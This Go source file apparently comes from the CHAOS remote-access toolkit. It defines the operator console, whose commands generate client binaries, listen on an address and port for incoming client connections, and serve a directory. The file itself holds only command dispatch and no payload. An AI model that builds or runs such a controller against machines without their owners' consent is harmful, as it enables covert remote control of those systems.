package app

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/handler/server"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"strings"
)

type appHandler struct {
	GenerateUseCase usecase.Build
	ServeUseCase    usecase.Serve
}

func NewAppHandler(generateUseCase usecase.Build, serveUseCase usecase.Serve) handler.App {
	return &appHandler{
		GenerateUseCase: generateUseCase,
		ServeUseCase:    serveUseCase,
	}
}

func (c appHandler) Handle() {
	p := prompt.New(
		c.executor,
		completer.HostCompleter,
		prompt.OptionPrefix("chaos > "),
		prompt.OptionPrefixTextColor(prompt.White),
	)
	p.Run()
}

func (c appHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch v {
		case "generate":
			if err := c.GenerateUseCase.BuildClientBinary(values); err != nil {
				fmt.Println("")
				fmt.Print(color.Red, " [!] Error building binary!\n", err.Error())
			}
			fmt.Println("")
			fmt.Print(color.White, " [i] Press [ENTER] key to continue...")
			util.EnterAnyKey()
			system.ClearScreen()
			return
		case "listen":
			serverHandler(values)
			return
		case "serve":
			c.ServeUseCase.ServeDirectory(values)
			return
		case "exit":
			system.QuitApp()
		default:
			fmt.Println(color.Red, " [!] Invalid parameter!")
			util.Sleep(3)
			system.ClearScreen()
			return
		}
	}
}

func serverHandler(v []string) {
	if !util.Contains(v, "address=") {
		fmt.Println(color.Yellow, "[!] You should specify a address!")
		return
	}
	if !util.Contains(v, "port=") {
		fmt.Println(color.Yellow, "[!] You should specify a port!")
		return
	}

	address := util.SplitAfterIndex(util.Find(v, "address="), '=')
	port := util.SplitAfterIndex(util.Find(v, "port="), '=')

	server.NewServerHandler(address, port).HandleConnections()
}
